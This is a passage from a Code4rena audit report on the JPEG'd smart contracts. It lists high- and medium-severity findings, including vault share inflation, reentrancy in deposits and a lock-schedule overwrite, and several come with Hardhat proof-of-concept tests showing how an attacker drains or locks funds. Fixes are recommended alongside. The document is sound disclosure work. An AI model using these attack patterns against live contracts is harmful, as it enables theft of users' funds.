href=\"#g-31-yvaultwithdrawjpeg-farm-should-get-cached\">G-31 <code>yVault.withdrawJPEG()</code>: <code>farm</code> should get cached</a></li>\n<li><a href=\"#g-32-upgrade-pragma-to-at-least-084\">G-32 Upgrade pragma to at least 0.8.4</a></li>\n<li><a href=\"#g-33-no-need-to-explicitly-initialize-variables-with-default-values\">G-33 No need to explicitly initialize variables with default values</a></li>\n<li><a href=\"#g-34--0-is-less-efficient-than--0-for-unsigned-integers-with-proof\">G-34 <code>> 0</code> is less efficient than <code>!= 0</code> for unsigned integers (with proof)</a></li>\n<li><a href=\"#g-35--is-cheaper-than-\">G-35 <code>>=</code> is cheaper than <code>></code></a></li>\n<li><a href=\"#g-36-an-arrays-length-should-be-cached-to-save-gas-in-for-loops\">G-36 An array’s length should be cached to save gas in for-loops</a></li>\n<li><a href=\"#g-37-i-costs-less-gas-compared-to-i-or-i--1\">G-37 <code>++i</code> costs less gas compared to <code>i++</code> or <code>i += 1</code></a></li>\n<li><a href=\"#g-38-increments-can-be-unchecked\">G-38 Increments can be unchecked</a></li>\n<li><a href=\"#g-39-use-calldata-instead-of-memory\">G-39 Use <code>calldata</code> instead of <code>memory</code></a></li>\n<li><a href=\"#g-40-consider-making-some-constants-as-non-public-to-save-gas\">G-40 Consider making some constants as non-public to save gas</a></li>\n<li><a href=\"#g-41-public-functions-to-external\">G-41 Public functions to external</a></li>\n<li><a href=\"#g-42-reduce-the-size-of-error-messages-long-revert-strings\">G-42 Reduce the size of error messages (Long revert Strings)</a></li>\n<li><a href=\"#g-43-use-custom-errors-instead-of-revert-strings-to-save-gas\">G-43 Use Custom Errors instead of Revert Strings to save Gas</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the JPEG'd smart contract system written in Solidity. The audit contest took place between April 7—April 13 2022.\n\n## Wardens\n\n66 Wardens contributed reports to the JPEG'd contest:\n\n  1. [cmichel](https://twitter.com/cmichelio)\n  1. [hickuphh3](https://twitter.com/HickupH)\n  1. [rayn](https://twitter.com/rayn731)\n  1. [WatchPug](https://twitter.com/WatchPug_)\n  1. [Dravee](https://twitter.com/JustDravee)\n  1. TrungOre\n  1. [berndartmueller](https://twitter.com/berndartmueller)\n  1. [Kenshin](https://twitter.com/nonfungiblenero)\n  1. minhquanym\n  1. AuditsAreUS\n  1. 0xDjango\n  1. IllIllI\n  1. cccz\n  1. Jujic\n  1. hyh\n  1. [pedroais](https://twitter.com/Pedroais2/)\n  1. Kthere\n  1. Foundation ([HardlyDifficult](https://twitter.com/HardlyDifficult) and [batu](https://twitter.com/ba2inal/))\n  1. 0x1f8b\n  1. PPrieditis\n  1. robee\n  1. [Meta0xNull](https://twitter.com/Meta0xNull)\n  1. [rfa](https://www.instagram.com/riyan_rfa/)\n  1. 0xkatana\n  1. TerrierLover\n  1. Cr4ckM3\n  1. ilan\n  1. [Funen](https://instagram.com/vanensurya)\n  1. [JMukesh](https://twitter.com/MukeshJ_eth)\n  1. [catchup](https://twitter.com/catchup22)\n  1. kenta\n  1. kebabsec (okkothejawa and [FlameHorizon](https://twitter.com/FlameHorizon1))\n  1. [ellahi](https://twitter.com/ellahinator)\n  1. Hawkeye (0xwags and 0xmint)\n  1. Cityscape\n  1. horsefacts\n  1. delfin454000\n  1. [Picodes](https://twitter.com/thePicodes)\n  1. [smiling_heretic](https://github.com/SmilingHeretic)\n  1. Wayne\n  1. [Ruhum](https://twitter.com/0xruhum)\n  1. reassor\n  1. hubble (ksk2345 and shri4net)\n  1. saian\n  1. [JC](https://twitter.com/sm4rtcontr4ct)\n  1. [dy](https://davidyat.es)\n  1. [pauliax](https://twitter.com/SolidityDev)\n  1. samruna\n  1. jayjonah8\n  1. [Tomio](https://twitter.com/meidhiwirara)\n  1. [0xNazgul](https://twitter.com/0xNazgul)\n  1. [0v3rf10w](https://twitter.com/_0v3rf10w)\n  1. [securerodd](https://twitter.com/securerodd)\n  1. FSchmoede\n  1. slywaters\n  1. [rokinot](twitter.com/rokinot)\n  1. nahnah\n  1. sorrynotsorry\n  1. dirk_y\n  1. [defsec](https://twitter.com/defsec_)\n  1. joshie\n  1. peritoflores\n\nThis contest was judged by [LSDan](https://twitter.com/lsdan_defi).\n\nFinal report assembled by [liveactionllama](https://twitter.com/liveactionllama).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 20 unique vulnerabilities. Of these vulnerabilities, 9 received a risk rating in the category of HIGH severity and 11 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 42 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 38 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 JPEG'd contest repository](https://github.com/code-423n4/2022-04-jpegd), and is composed of 14 smart contracts written in the Solidity programming language and includes 3,118 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (9)\n## [[H-01] yVault: First depositor can break minting of shares](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12)\n_Submitted by hickuphh3, also found by 0xDjango, berndartmueller, cmichel, hyh, and WatchPug_\n\n[yVault.sol#L148-L153](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L148-L153)<br>\n\nThe attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\\_ToB_yearn_vaultsv2/ToB\\_-\\_Yearn_Vault_v\\_2\\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.\n\n### Proof of Concept\n\n*   Attacker deposits 1 wei to mint 1 share\n*   Attacker transfers exorbitant amount to the `StrategyPUSDConvex` contract to greatly inflate the share’s price. Note that the strategy deposits its entire balance into Convex when its `deposit()` function is called.\n*   Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.\n\nInsert this test into [`yVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/yVault.ts).\n\n```jsx\nit.only(\"will cause 0 share issuance\", async () => {\n  // mint 10k + 1 wei tokens to user1\n  // mint 10k tokens to owner\n  let depositAmount = units(10_000);\n  await token.mint(user1.address, depositAmount.add(1));\n  await token.mint(owner.address, depositAmount);\n  // token approval to yVault\n  await token.connect(user1).approve(yVault.address, 1);\n  await token.connect(owner).approve(yVault.address, depositAmount);\n  \n  // 1. user1 mints 1 wei = 1 share\n  await yVault.connect(user1).deposit(1);\n  \n  // 2. do huge transfer of 10k to strategy\n  // to greatly inflate share price (1 share = 10k + 1 wei)\n  await token.connect(user1).transfer(strategy.address, depositAmount);\n  \n  // 3. owner deposits 10k\n  await yVault.connect(owner).deposit(depositAmount);\n  // receives 0 shares in return\n  expect(await yVault.balanceOf(owner.address)).to.equal(0);\n\n  // user1 withdraws both his and owner's deposits\n  // total amt: 20k + 1 wei\n  await expect(() => yVault.connect(user1).withdrawAll())\n    .to.changeTokenBalance(token, user1, depositAmount.mul(2).add(1));\n});\n```\n\n### Recommended Mitigation Steps\n\n*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.\n*   Ensure the number of shares to be minted is non-zero: `require(_shares != 0, \"zero shares minted\");`\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12#issuecomment-1099249025):**\n > Fixed in [jpegd/core#16](https://github.com/jpegd/core/pull/16).\n\n\n\n***\n\n## [[H-02] Existing user’s locked JPEG could be overwritten by new user, causing permanent loss of JPEG funds](https://github.com/code-423n4/2022-04-jpegd-findings/issues/10)\n_Submitted by hickuphh3, also found by 0x1f8b, AuditsAreUS, Foundation, Kthere, Meta0xNull, rayn, and WatchPug_\n\n[NFTVault.sol#L375](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L375)<br>\n[JPEGLock.sol#L54-L62](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/lock/JPEGLock.sol#L54-L62)<br>\n\nA user’s JPEG lock schedule can be overwritten by another user’s if he (the other user) submits and finalizes a proposal to change the same NFT index’s value.\n\nThe existing user will be unable to withdraw his locked JPEGs, resulting in permanent lock up of JPEG in the locker contract.\n\n### Proof of Concept\n\n1.  `user` successfully proposes and finalizes a proposal to change his NFT’s collateral value\n2.  Another user (`owner`) does the same for the same NFT index\n3.  `user` will be unable to withdraw his locked JPEG because schedule has been overwritten\n\nInsert this test case into [`NFTVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/NFTVault.ts).\n\n```jsx\nit.only(\"will overwrite existing user's JPEG lock schedule\", async () => {\n  // 0. setup\n  const index = 7000;\n  await erc721.mint(user.address, index);\n  await nftVault\n    .connect(dao)\n    .setPendingNFTValueETH(index, units(50));\n  await jpeg.transfer(user.address, units(150000));\n  await jpeg.connect(user).approve(locker.address, units(500000));\n  await jpeg.connect(owner).approve(locker.address, units(500000));\n\n  // 1. user has JPEG locked for finalization\n  await nftVault.connect(user).finalizePendingNFTValueETH(index);\n\n  // 2. owner submit proposal to further increase NFT value\n  await nftVault\n    .connect(dao)\n    .setPendingNFTValueETH(index, units(100));\n  \n  // 3. owner finalizes, has JPEG locked\n  await nftVault.connect(owner).finalizePendingNFTValueETH(index);\n\n  // user schedule has been overwritten\n  let schedule = await locker.positions(index);\n  expect(schedule.owner).to.equal(owner.address);\n\n  // user tries to unstake\n  // wont be able to because schedule was overwritten\n  await timeTravel(days(366));\n  await expect(locker.connect(user).unlock(index)).to.be.revertedWith(\"unauthorized\");\n});\n```\n\n### Recommended Mitigation Steps\n\n1.  Release the tokens of the existing schedule. Simple and elegant.\n\n```jsx\n// in JPEGLock#lockFor()\nLockPosition memory existingPosition = positions[_nftIndex];\nif (existingPosition.owner != address(0)) {\n  // release jpegs to existing owner\n  jpeg.safeTransfer(existingPosition.owner, existingPosition.lockAmount);\n}\n```\n\n2.  Revert in `finalizePendingNFTValueETH()` there is an existing lock schedule. This is less desirable IMO, as there is a use-case for increasing / decreasing the NFT value.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/10)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/10#issuecomment-1099232121):**\n > Fixed in [jpegd/core#3](https://github.com/jpegd/core/pull/3).\n\n\n\n***\n\n## [[H-03] Update initializer modifier to prevent reentrancy during initialization](https://github.com/code-423n4/2022-04-jpegd-findings/issues/227)\n_Submitted by Dravee_\n\n[package.json#L18-L19](https://github.com/code-423n4/2022-04-jpegd/blob/main/package.json#L18-L19)<br>\n\nThe solution uses:\n\n```jsx\n    \"@openzeppelin/contracts\": \"^4.0.0\",\n    \"@openzeppelin/contracts-upgradeable\": \"^4.3.2\",\n```\n\nThese dependencies have a known high severity vulnerability:\n\n*   <https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177>\n*   <https://snyk.io/test/npm/@openzeppelin/contracts-upgradeable/4.3.2#SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177>\n*   <https://snyk.io/test/npm/@openzeppelin/contracts/4.0.0#SNYK-JS-OPENZEPPELINCONTRACTS-2320176>\n\nWhich makes these contracts vulnerable:\n\n```jsx\ncontracts/helpers/CryptoPunksHelper.sol:\n  19:     function initialize(address punksAddress) external initializer {\n\ncontracts/helpers/EtherRocksHelper.sol:\n  19:     function initialize(address rocksAddress) external initializer {\n\ncontracts/staking/JPEGStaking.sol:\n  21:     function initialize(IERC20Upgradeable _jpeg) external initializer {\n\ncontracts/vaults/FungibleAssetVaultForDAO.sol:\n  71:     ) external initializer {\n\ncontracts/vaults/NFTVault.sol:\n  149:     ) external initializer {\n```\n\n### Recommended Mitigation Steps\n\nUpgrade `@openzeppelin/contracts` and `@openzeppelin/contracts-upgradeable` to version 4.4.1 or higher.\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/227)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/227#issuecomment-1099246138):**\n > Fixed in [jpegd/core#11](https://github.com/jpegd/core/pull/11).\n\n\n\n***\n\n## [[H-04] Reentrancy issue in `yVault.deposit`](https://github.com/code-423n4/2022-04-jpegd-findings/issues/81)\n_Submitted by cmichel_\n\n[yVault.sol#L144-L145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L144-L145)<br>\n\nIn `deposit`, the balance is cached and then a `token.transferFrom` is triggered which can lead to exploits if the `token` is a token that gives control to the sender, like ERC777 tokens.\n\n### Proof of Concept\n\nInitial state: `balance() = 1000`, shares `supply = 1000`.\nDepositing 1000 amount should mint 1000 supply, but one can split the 1000 amounts into two 500 deposits and use re-entrancy to profit.\n\n*   Outer `deposit(500)`: `balanceBefore = 1000`. Control is given to attacker ...\n*   Inner `deposit(500)`: `balanceBefore = 1000`. `shares = (_amount * supply) / balanceBefore = 500 * 1000 / 1000 = 500` shares are minted ...\n*   Outer `deposit(500)` continues with the mint: `shares = (_amount * supply) / balanceBefore = 500 * 1500 / 1000 = 750` are minted.\n*   Withdrawing the `500 + 750 = 1250` shares via `withdraw(1250)`, the attacker receives `backingTokens = (balance() * _shares) / supply = 2000 * 1250 / 2250 = 1111.111111111`. The attacker makes a profit of `1111 - 1000 = 111` tokens.\n*   They repeat the attack until the vault is drained.\n\n### Recommended Mitigation Steps\n\nThe `safeTransferFrom` should be the last call in `deposit`.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/81)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/81#issuecomment-1099250750):**\n > Fixed in [jpegd/core#19](https://github.com/jpegd/core/pull/19).\n\n\n\n***\n\n## [[H-05] `yVaultLPFarming`: No guarantee JPEG currentBalance > previousBalance](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56)\n_Submitted by hickuphh3_\n\n[yVaultLPFarming.sol#L169-L170](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L169-L170)<br>\n\nyVault users participating in the farm have to trust that:\n\n*   `vault.balanceOfJPEG()`  returns the correct claimable JPEG amount by its strategy / strategies\n*   the strategy / strategies will send all claimable JPEG to the farm\n\nShould either of these assumptions break, then it could possibly be the case that `currentBalance` is less than `previousBalance`, causing deposits and crucially, withdrawals to fail due to subtraction overflow.\n\n### Proof of Concept\n\nFor instance,\n\n*   Farm migration occurs. A new farm is set in `yVault`, then `withdrawJPEG()` is called, which sends funds to the new farm. Users of the old farm would be unable to withdraw their deposits.\n\n```jsx\nit.only(\"will revert old farms' deposits and withdrawals if yVault migrates farm\", async () => {\n  // 0. setup\n  await token.mint(owner.address, units(1000));\n  await token.approve(yVault.address, units(1000));\n  await yVault.depositAll();\n  await yVault.approve(lpFarming.address, units(1000));\n  // send some JPEG to strategy prior to deposit\n  await jpeg.mint(strategy.address, units(100));\n  // deposit twice, so that the second deposit will invoke _update()\n  await lpFarming.deposit(units(250));\n  await lpFarming.deposit(units(250));\n\t\n  // 1. change farm and call withdrawJPEG()\n  await yVault.setFarmingPool(user1.address);\n  await yVault.withdrawJPEG();\n\t\n  // deposit and withdrawal will fail\n  await expect(lpFarming.deposit(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n  await expect(lpFarming.withdraw(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n});\n```\n\n*   Strategy migration occurs, but JPEG funds held by the old strategy were not claimed, causing `vault.balanceOfJPEG()` to report a smaller amount than previously recorded\n*   `jpeg` could be accidentally included in the StrategyConfig, resulting in JPEG being converted to other assets\n*   A future implementation takes a fee on the `jpeg` to be claimed\n\n### Recommended Mitigation Steps\n\nA simple fix would be to `return` if `currentBalance ≤ previousBalance`. A full fix would properly handle potential shortfall.\n\n```jsx\nif (currentBalance <= previousBalance) return;\n```\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1096865375):**\n > The issue can be reproduced, but due to the extremely specific cases in which this happens the severity should be lowered to 2.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1099243025):**\n > Fixed in [jpegd/core#7](https://github.com/jpegd/core/pull/7).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1109877532):**\n > I disagree with the sponsor. This is high risk.\n\n\n\n***\n\n## [[H-06] Setting new controller can break `YVaultLPFarming`](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80)\n_Submitted by cmichel_\n\n[yVaultLPFarming.sol#L170](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170)<br>\n[yVault.sol#L108](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L108)<br>\n\nThe accruals in `yVaultLPFarming` will fail if [`currentBalance < previousBalance`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170) in `_computeUpdate`.\n\n```solidity\ncurrentBalance = vault.balanceOfJPEG() + jpeg.balanceOf(address(this));\nuint256 newRewards = currentBalance - previousBalance;\n```\n\nNo funds can be withdrawn anymore as the `withdraw` functions first trigger an `_update`.\n\nThe `currentBalance < previousBalance` case can, for example, be triggerd by decreasing the `vault.balanceOfJPEG()` due to calling `yVault.setController`:\n\n```solidity\nfunction setController(address _controller) public onlyOwner {\n    // @audit can reduce balanceofJpeg which breaks other masterchef contract\n    require(_controller != address(0), \"INVALID_CONTROLLER\");\n    controller = IController(_controller);\n}\n\nfunction balanceOfJPEG() external view returns (uint256) {\n    // @audit new controller could return a smaller balance\n    return controller.balanceOfJPEG(address(token));\n}\n```\n\n### Recommended Mitigation Steps\n\nSetting a new controller on a vault must be done very carefully and requires a migration.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80#issuecomment-1109891540):**\n > This is not a duplicate of H-05. Though both of them deal with issues related to balanceOfJPEG, they describe different causes.\n\n**[spaghettieth (JPEG'd) acknowledged](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80)**\n\n\n\n***\n\n## [[H-07] Controller: Strategy migration will fail](https://github.com/code-423n4/2022-04-jpegd-findings/issues/57)\n_Submitted by hickuphh3, also found by rayn_\n\n[Controller.sol#L95](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/Controller.sol#L95)<br>\n[StrategyPUSDConvex.sol#L266](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L266)<br>\n\nThe controller calls the `withdraw()` method to withdraw JPEGs from the contract, but the strategy might blacklist the JPEG asset, which is what the PUSDConvex strategy has done.\n\nThe migration would therefore revert.\n\n### Proof of Concept\n\nInsert this test into [`StrategyPUSDConvex.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/StrategyPUSDConvex.ts).\n\n```jsx\nit.only(\"will revert when attempting to migrate strategy\", async () => {\n  await controller.setVault(want.address, yVault.address);\n  await expect(controller.setStrategy(want.address, strategy.address)).to.be.revertedWith(\"jpeg\");\n});\n```\n\n### Recommended Mitigation Steps\n\nReplace `_current.withdraw(address(jpeg));` with `_current.withdrawJPEG(vaults[_token])`.\n\n**[spaghettieth (JPEG'd) confirmed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/57#issuecomment-1096633358):**\n > The proposed migration steps would modify the intended behaviour, which is to withdraw JPEG to the controller and not the vault. A correct solution would be replacing `_current.withdraw(address(jpeg))` with `_current.withdrawJPEG(address(this))`.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/57#issuecomment-1099242526):**\n > Fixed in [jpegd/core#6](https://github.com/jpegd/core/pull/6).\n\n\n\n***\n\n## [[H-08] `StrategyPUSDConvex.balanceOfJPEG` uses incorrect function signature while calling `extraReward.earned`, causing the function to unexpectedly revert everytime](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139)\n_Submitted by rayn_\n\n[StrategyPUSDConvex.sol#L234](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234)<br>\n\nAs specified in Convex [BaseRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L149) and [VirtualRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/VirtualBalanceRewardPool.sol#L127), the function signature of `earned` is `earned(address)`. However, `balanceOfJPEG` did not pass any arguments to `earned`, which would cause `balanceOfJPEG` to always revert.\n\nThis bug will propagate through `Controller` and `YVault` until finally reaching the source of the call in `YVaultLPFarming ._computeUpdate`, and render the entire farming contract unuseable.\n\n### Proof of Concept\n\nBoth `BaseRewardPool.earned` and `VirtualBalanceRewardPool.earned` takes an address as argument\n\n        function earned(address account) public view returns (uint256) {\n            return\n                balanceOf(account)\n                    .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                    .div(1e18)\n                    .add(rewards[account]);\n        }\n\n        function earned(address account) public view returns (uint256) {\n            return\n                balanceOf(account)\n                    .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                    .div(1e18)\n                    .add(rewards[account]);\n        }\n\nBut `balanceOfJPEG` does not pass any address to `extraReward.earned`, causing the entire function to revert when called\n\n        function balanceOfJPEG() external view returns (uint256) {\n            uint256 availableBalance = jpeg.balanceOf(address(this));\n\n            IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n            uint256 length = baseRewardPool.extraRewardsLength();\n            for (uint256 i = 0; i < length; i++) {\n                IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n                if (address(jpeg) == extraReward.rewardToken()) {\n                    availableBalance += extraReward.earned();\n                    //we found jpeg, no need to continue the loop\n                    break;\n                }\n            }\n\n            return availableBalance;\n        }\n\n### Tools Used\n\nvim, ganache-cli\n\n### Recommended Mitigation Steps\n\nPass `address(this)` as argument of `earned`.\n\nNotice how we modify the fetching of reward. This is reported in a separate bug report, but for completeness, the entire fix is shown in both report entries.\n\n        function balanceOfJPEG() external view returns (uint256) {\n            uint256 availableBalance = jpeg.balanceOf(address(this));\n\n            IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n            availableBalance += baseRewardPool.earned(address(this));\n            uint256 length = baseRewardPool.extraRewardsLength();\n            for (uint256 i = 0; i < length; i++) {\n                IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n                if (address(jpeg) == extraReward.rewardToken()) {\n                    availableBalance += extraReward.earned(address(this));\n                }\n            }\n\n            return availableBalance;\n        }\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139#issuecomment-1099248200):**\n > Fixed in [jpegd/core#15](https://github.com/jpegd/core/pull/15).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139#issuecomment-1109915863):**\n > Leaving this as high risk. The issue would cause a loss of funds.\n\n\n\n***\n\n## [[H-09] Bad debts should not continue to accrue interest](https://github.com/code-423n4/2022-04-jpegd-findings/issues/167)\n_Submitted by WatchPug_\n\n[NFTVault.sol#L844-L851](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L844-L851)<br>\n\n```solidity\nuint256 debtAmount = _getDebtAmount(_nftIndex);\nrequire(\n    debtAmount >= _getLiquidationLimit(_nftIndex),\n    \"position_not_liquidatable\"\n);\n\n// burn all payment\nstablecoin.burnFrom(msg.sender, debtAmount);\n```\n\nIn the current design/implementation, the liquidator must fully repay the user's outstanding debt in order to get the NFT.\n\nWhen the market value of the NFT fell rapidly, the liquidators may not be able to successfully liquidate as they can not sell the NFT for more than the debt amount.\n\nIn that case, the protocol will have positions that are considered bad debts.\n\nHowever, these loans, which may never be repaid, are still accruing interest. And every time the DAO collects interest, new `stablecoin` will be minted.\n\nWhen the proportion of bad debts is large enough since the interest generated by these bad debts is not backed. It will damage the authenticity of the stablecoin.\n\n### Proof of Concept\n\nGiven:\n\n*   `NFT 1` worth 30,000 USD\n*   `creditLimitRate` = 60%\n*   `liquidationLimitRate` = 50%\n*   `debtInterestApr` = 10%\n\n1.  Alice borrowed `10,000 USD` with `NFT #1`;\n2.  After 1 year, `NFT 1`'s market value in USD has suddenly dropped to `10,000` USD, no liquidator is willing to repay 11,000 USD for `NFT #1`;\n3.  The DAO `collect()` and minted `1,000` stablecoin;\n4.  After 1 year, the DAO call `collect()` will mint `1,100` stablecoin. and so on...\n\n### Recommended Mitigation Steps\n\nConsider adding a stored value to record the amount of bad debt, and add a public function that allows anyone to mark a bad debt to get some reward. and change `accrue` to:\n\n```solidity\nuint256 internal badDebtPortion;\n\nfunction accrue() public {\n    uint256 additionalInterest = _calculateAdditionalInterest();\n\n    totalDebtAccruedAt = block.timestamp;\n\n    totalDebtAmount += additionalInterest;\n\n    uint256 collectibleInterest = additionalInterest * (totalDebtPortion - badDebtPortion) / totalDebtPortion;\n    totalFeeCollected += collectibleInterest;\n}\n```\n\n**[spaghettieth (JPEG'd) acknowledged, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/167)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/167#issuecomment-1109933407):**\n > I agree with the warden. Left unchecked, this issue is almost certain to occur and will cause substantial negative impacts on the protocol. The only way this would not occur is if the NFT market never crashes.\n\n\n\n***\n \n# Medium Risk Findings (11)\n## [[M-01] When _lpToken is jpeg, reward calculation is incorrect](https://github.com/code-423n4/2022-04-jpegd-findings/issues/1)\n_Submitted by cccz, also found by minhquanym_\n\nIn the LPFarming contract, a new staking pool can be added using the add() function. The staking token for the new pool is defined using the \\_lpToken variable. However, there is no additional checking whether the \\_lpToken is the same as the reward token (jpeg) or not.\n\n        function add(uint256 _allocPoint, IERC20 _lpToken) external onlyOwner {\n            _massUpdatePools();\n\n            uint256 lastRewardBlock = _blockNumber();\n            totalAllocPoint = totalAllocPoint + _allocPoint;\n            poolInfo.push(\n                PoolInfo({\n                    lpToken: _lpToken,\n                    allocPoint: _allocPoint,\n                    lastRewardBlock: lastRewardBlock,\n                    accRewardPerShare: 0\n                })\n            );\n        }\n\nWhen the \\_lpToken is the same token as jpeg, reward calculation for that pool in the updatePool() function can be incorrect. This is because the current balance of the \\_lpToken in the contract is used in the calculation of the reward. Since the \\_lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be.\n\n        function _updatePool(uint256 _pid) internal {\n            PoolInfo storage pool = poolInfo[_pid];\n            if (pool.allocPoint == 0) {\n                return;\n            }\n\n            uint256 blockNumber = _blockNumber();\n            //normalizing the pool's `lastRewardBlock` ensures that no rewards are distributed by staking outside of an epoch\n            uint256 lastRewardBlock = _normalizeBlockNumber(pool.lastRewardBlock);\n            if (blockNumber <= lastRewardBlock) {\n                return;\n            }\n            uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n            if (lpSupply == 0) {\n                pool.lastRewardBlock = blockNumber;\n                return;\n            }\n            uint256 reward = ((blockNumber - lastRewardBlock) *\n                epoch.rewardPerBlock *\n                1e36 *\n                pool.allocPoint) / totalAllocPoint;\n            pool.accRewardPerShare = pool.accRewardPerShare + reward / lpSupply;\n            pool.lastRewardBlock = blockNumber;\n        }\n\n### Proof of Concept\n\n[LPFarming.sol#L141-L154](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L141-L154)<br>\n[LPFarming.sol#L288-L311](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L288-L311)<br>\n\n### Recommended Mitigation Steps\n\nAdd a check that \\_lpToken is not jpeg in the add function or mint the reward token to another contract to prevent the 